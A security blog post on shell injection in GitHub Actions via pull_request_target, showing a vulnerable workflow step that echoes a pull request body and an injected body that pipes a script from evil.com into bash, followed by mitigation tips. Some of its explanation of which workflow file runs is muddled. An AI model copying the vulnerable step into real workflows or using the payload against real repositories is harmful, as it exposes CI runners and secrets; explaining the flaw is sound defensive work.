---
title: Shell Injection In Github Actions Ci Cd
published: true
date: 2023-07-09 03:28:33 UTC
tags: medium,blog,python
canonical_url: https://medium.com/p/-dc137317bc9
---

# Shell injection in GitHub Actions CI/CD

Translated from my blog in Spanish: https://medium.com/@kfir_g/inyecci%C3%B3n-de-shell-en-ci-cd-de-github-actions-83f03a7252ce 

* * *

### Shell injection in GitHub Actions CI/CD

* * *

Translated from my blog in Spanish: <https://medium.com/@kfir_g/inyecci%C3%B3n-de-shell-en-ci-cd-de-github-actions-83f03a7252ce>

* * *

GitHub Actions offers a special event type called `pull_request_target`that allows workflows to run on pull requests from forks with the same permissions as the base repository. This can be useful for some scenarios, such as commenting on pull requests or checking out private dependencies. However, it also comes with significant security risks, and should be used with caution.

One of the main risks of using `pull_request_target`is that it exposes secrets and environment variables to untrusted code from the pull request. This means that an attacker can create a malicious pull request that steals or leaks these sensitive information, or uses them to perform unauthorized actions on behalf of the repository owner. For example, an attacker could access the GitHub token and create new issues, comments, releases, or even delete the repository.

Another risk of using `pull_request_target`is that it runs the workflow file from the base branch, not from the pull request branch. This means that an attacker can modify the workflow file in the pull request and inject arbitrary commands or scripts that will run on the base branch’s workflow. For example, an attacker could add a step that runs `rm -rf /`on the runner machine, or executes a remote shell.

One of the ways that an attacker can inject commands or scripts into the workflow is by using shell injection. Shell injection is a technique that exploits a vulnerability in a program that executes a command in a shell without properly escaping or validating the input. For example, if the workflow uses a step like this:
    
    
    - name: inject command  
      run: echo ${{ github.event.pull_request.body }}

An attacker could create a pull request with a body like this:
    
    
    Hello world; curl https://evil.com/script.sh | bash

This would cause the workflow to run the command `echo Hello World; curl https://evil.com/script.sh | bash`, which would download and execute a malicious script from an external source.

To prevent shell injection attacks, GitHub Actions users should follow some best practices, such as:  
— Escaping or quoting the input from the pull request before using it in the workflow.   
— Using built-in functions or actions to handle the input instead of running commands in a shell.   
— Using code scanning tools to detect vulnerabilities in the code or the workflow.   
— Using third-party tools or services to run workflows in isolated environments.

* * *

References:   
<https://securitylab.github.com/research/github-actions-preventing-pwn-requests/>  
<https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/>

By [Kfir Gisman](https://medium.com/@Kfir-G) on [July 9, 2023](https://medium.com/p/dc137317bc9).

[Canonical link](https://medium.com/@Kfir-G/shell-injection-in-github-actions-ci-cd-dc137317bc9)

Exported from [Medium](https://medium.com) on December 20, 2025.
